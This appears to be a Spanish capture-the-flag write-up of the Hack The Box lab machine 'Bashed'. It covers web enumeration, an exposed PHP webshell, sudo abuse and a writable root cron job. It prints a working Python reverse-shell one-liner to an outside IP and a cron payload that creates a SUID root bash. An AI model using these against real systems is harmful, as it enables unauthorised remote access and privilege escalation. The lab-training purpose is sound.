# Bashed — Hack The Box

**Máquina:** Bashed · **SO:** Linux · **Dificultad:** Easy · **Lista:** TJ Null (OSCP)

| Campo | Detalle |
|---|---|
| Objetivo | `10.129.77.59` (bashed) |
| Sistema | Linux — Ubuntu (Apache 2.4.18) |
| Vector de entrada | Webshell `phpbash.php` expuesta en `/dev` |
| Escalada | www-data → scriptmanager (sudo NOPASSWD) → root (cron escribible) |
| Herramientas | nmap, gobuster, netcat, python |

---

## 1. Resumen

Bashed solo expone un servidor web. La entrada se consigue localizando una webshell (`phpbash.php`) dejada en `/dev`, que da ejecución de comandos como **www-data**. La escalada es en dos saltos: a **scriptmanager** mediante un permiso sudo sin contraseña, y de ahí a **root** mediante un script que root ejecuta periódicamente (cron) y que scriptmanager puede modificar.

---

## 2. Enumeración

Un único puerto abierto → toda la vía es web.

```console
$ nmap -p- --min-rate=1000 -T4 10.129.77.59
80/tcp open  http

$ nmap -sC -sV -p 80 10.129.77.59
80/tcp open  http  Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
```

Enumeración de rutas ocultas:
```console
$ gobuster dir -u http://10.129.77.59 -w /usr/share/wordlists/dirb/common.txt
/css  /dev  /fonts  /images  /js  /php  /uploads
```

La carpeta `/dev` contiene `phpbash.php` — una webshell en PHP (del propio Arrexel) que da una terminal del servidor en el navegador.

---

## 3. Foothold — webshell phpbash

Se abre `http://10.129.77.59/dev/phpbash.php` → ejecución de comandos en el servidor:
```console
whoami
www-data
```

---

## 4. Escalada: www-data → scriptmanager

`sudo -l` revela un permiso sin contraseña:
```console
sudo -l
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

Como la webshell no es interactiva, se monta una **reverse shell** ya como scriptmanager:
```console
# En Kali (listener):
nc -lvnp 4444

# Desde la webshell (reverse shell con Python):
sudo -u scriptmanager python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.195",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```
```console
scriptmanager@bashed:~$ whoami
scriptmanager
```

> La variante con `bash -i >& /dev/tcp/...` no conectó desde phpbash; la de Python sí. Lección: tener varias técnicas de reverse shell a mano.

---

## 5. Escalada: scriptmanager → root (cron escribible)

En la raíz del sistema aparece una carpeta fuera de lo normal, propiedad de scriptmanager:
```console
ls -la /
drwxrwxr-- 2 scriptmanager scriptmanager 4096 ... scripts

cd /scripts; ls -la
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4 2017 test.py
-rw-r--r-- 1 root          root          12 Oct 22 01:22 test.txt
```

**Detalle clave:** `test.py` es de scriptmanager (modificable), pero `test.txt` es de **root** y con fecha reciente → root ejecuta `test.py` cada pocos minutos (cron). Se reescribe el script con código propio:
```console
echo 'import os' > test.py
echo 'os.system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")' >> test.py
```

Cuando el cron lo ejecuta (como root), se crea un bash con bit SUID propiedad de root:
```console
ls -la /tmp/rootbash
-rwsr-sr-x 1 root root 1037528 ... /tmp/rootbash

/tmp/rootbash -p
whoami
root
```

> **La técnica (cron escribible):** un cron que ejecuta como root un script modificable por un usuario sin privilegios = escalada directa. El código crea un bash SUID; el `-p` al ejecutarlo mantiene los privilegios de root.

---

## 6. Resumen de la cadena

| Fase | Acción | Resultado |
|---|---|---|
| Enumeración | nmap + gobuster | Puerto 80, carpeta /dev |
| Foothold | phpbash.php | Shell como www-data |
| Escalada 1 | sudo -l + reverse shell | Usuario scriptmanager |
| Escalada 2 | cron escribible + SUID bash | Shell como root |
| Flags | root.txt + user.txt | Máquina completada |
